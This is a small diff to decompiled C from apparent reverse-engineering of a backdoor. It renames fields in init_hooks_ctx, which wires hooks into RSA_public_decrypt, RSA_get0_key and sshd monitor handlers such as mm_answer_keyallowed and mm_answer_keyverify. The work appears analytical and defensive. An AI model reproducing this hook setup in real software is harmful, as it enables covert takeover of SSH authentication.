@@ -21,23 +21,16 @@ int init_hooks_ctx(backdoor_hooks_ctx_t *ctx)
   
   status = 5;
   if (ctx != (backdoor_hooks_ctx_t *)0x0) {
-    ctx->hooks_data_addr = (backdoor_hooks_data_t **)&hooks_data;
+    ctx->hooks_data_slot = (backdoor_hooks_data_t **)&hooks_data;
     status = 0;
-    if (ctx->shared == (backdoor_shared_globals_t *)0x0) {
-      ctx->_unknown1632[0] = '\x04';
-      ctx->_unknown1632[1] = '\0';
-      ctx->_unknown1632[2] = '\0';
-      ctx->_unknown1632[3] = '\0';
-      ctx->_unknown1632[4] = '\0';
-      ctx->_unknown1632[5] = '\0';
-      ctx->_unknown1632[6] = '\0';
-      ctx->_unknown1632[7] = '\0';
-      ctx->symbind64 = (audit_symbind64_fn)&LAB_001028d0;
-      ctx->hook_RSA_public_decrypt = hook_RSA_public_decrypt;
-      ctx->hook_RSA_get0_key = hook_RSA_get0_key;
-      ctx->mm_log_handler = mm_log_handler_hook;
-      ctx->mm_answer_keyallowed = mm_answer_keyallowed_hook;
-      ctx->mm_answer_keyverify = mm_answer_keyverify_hook;
+    if (ctx->shared_globals == (backdoor_shared_globals_t *)0x0) {
+      ctx->bootstrap_flags = 4;
+      ctx->symbind64_handler = (audit_symbind64_fn)&LAB_001028d0;
+      ctx->rsa_public_decrypt_hook = hook_RSA_public_decrypt;
+      ctx->rsa_get0_key_hook = hook_RSA_get0_key;
+      ctx->mm_log_handler_hook = mm_log_handler_hook;
+      ctx->mm_answer_keyallowed_hook = mm_answer_keyallowed_hook;
+      ctx->mm_answer_keyverify_hook = mm_answer_keyverify_hook;
       status = 0x65;
     }
   }
